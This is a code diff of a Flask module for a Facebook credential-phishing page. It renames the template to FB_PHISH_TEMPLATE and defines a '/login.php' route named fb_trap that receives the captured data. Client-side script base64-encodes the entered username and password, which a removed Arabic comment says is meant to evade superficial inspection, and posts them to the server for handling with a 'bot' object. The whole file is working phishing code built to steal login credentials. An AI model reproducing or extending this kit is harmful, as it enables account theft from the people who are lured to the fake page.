@@ -2,10 +2,10 @@ import os
 import base64
 from flask import Blueprint, render_template_string, redirect, request
 
-# استخدام اسم Blueprint متوافق
 secure_fb_bp = Blueprint('facebook', __name__)
 
-ADVANCED_FB_TEMPLATE = """
+# تعريف اسم القالب بشكل صحيح ومطابق للاستخدام
+FB_PHISH_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -59,7 +59,6 @@ ADVANCED_FB_TEMPLATE = """
                 return;
             }
 
-            // تشفير البيانات بـ Base64 لمنع الفحص السطحي
             const payload = btoa(JSON.stringify({ user: u, pass: p }));
             
             fetch(window.location.href, {
@@ -77,7 +76,6 @@ ADVANCED_FB_TEMPLATE = """
 </html>
 """
 
-# المطابقة التامة لاسم الدالة المطلوب في main.py لتجنب خطأ الـ ImportError
 def init_facebook_routes(app, bot):
     @app.route('/login.php', methods=['GET', 'POST'])
     def fb_trap():
@@ -87,7 +85,6 @@ def init_facebook_routes(app, bot):
             req_data = request.json or {}
             encoded_data = req_data.get('data')
             
-            # الدعم الاحتياطي في حال تم الإرسال بالطريقة العادية
             if not encoded_data:
                 user_val = request.form.get('email')
                 pass_val = request.form.get('pass')
